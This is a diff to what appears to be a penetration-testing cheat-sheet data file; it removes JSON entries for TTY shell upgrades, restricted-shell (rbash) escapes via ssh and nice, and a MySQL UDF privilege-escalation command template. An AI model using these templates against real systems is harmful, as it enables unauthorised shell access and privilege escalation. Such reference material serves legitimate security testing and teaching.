@@ -584,78 +584,6 @@
           ]
         },
         {
-          "id": "tty_python_upgrade",
-          "title": "TTY Shell Upgrade with Python",
-          "category": "Linux Shell & System",
-          "subcategory": "Shell Upgrades",
-          "description": "Turns a dumb shell into a fully interactive TTY using Python",
-          "template": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
-          "tags": [
-            "linux",
-            "tty",
-            "shell",
-            "python",
-            "pty"
-          ]
-        },
-        {
-          "id": "tty_expect_upgrade",
-          "title": "TTY Shell Upgrade with Expect",
-          "category": "Linux Shell & System",
-          "subcategory": "Shell Upgrades",
-          "description": "Alternative to Python to get an interactive shell",
-          "template": "/usr/bin/expect sh",
-          "tags": [
-            "linux",
-            "tty",
-            "shell",
-            "expect"
-          ]
-        },
-        {
-          "id": "linux_busybox_shell",
-          "title": "TTY Shell Upgrade with Busybox",
-          "category": "Linux Shell & System",
-          "subcategory": "Shell Upgrades",
-          "description": "Alternative to start an interactive shell on devices without Python/Bash",
-          "template": "/bin/busybox sh",
-          "tags": [
-            "linux",
-            "tty",
-            "busybox",
-            "shell"
-          ]
-        },
-        {
-          "id": "restricted_shell_bypass_ssh",
-          "title": "Bypass Restricted Shell via SSH",
-          "category": "Linux Shell & System",
-          "subcategory": "Shell Upgrades",
-          "description": "Method to break out of rbash by executing command via SSH",
-          "template": "ssh {{USERNAME}}@{{TARGET_IP}} ls -l /tmp",
-          "tags": [
-            "linux",
-            "rbash",
-            "bypass",
-            "escape",
-            "ssh"
-          ]
-        },
-        {
-          "id": "restricted_shell_bypass_nice",
-          "title": "Bypass Restricted Shell via Nice",
-          "category": "Linux Shell & System",
-          "subcategory": "Shell Upgrades",
-          "description": "Method to break out of rbash using the nice command",
-          "template": "nice /bin/bash",
-          "tags": [
-            "linux",
-            "rbash",
-            "bypass",
-            "escape"
-          ]
-        },
-        {
           "id": "python_http_server",
           "title": "Python 3 HTTP File Server",
           "category": "Linux Shell & System",
@@ -794,20 +722,6 @@
             "registry",
             "hives",
             "offline"
-          ]
-        },
-        {
-          "id": "privesc_mysql_udf",
-          "title": "Privilege Escalation: MySQL UDF Command Execution",
-          "category": "Linux Shell & System",
-          "subcategory": "Privilege Escalation",
-          "description": "Executes commands via MySQL User Defined Functions (UDF)",
-          "template": "create function do_system returns integer soname '{{FILE_NAME}}'; select do_system('id > /tmp/udf_out; cat /tmp/udf_out');",
-          "tags": [
-            "mysql",
-            "udf",
-            "privesc",
-            "database"
           ]
         },
         {
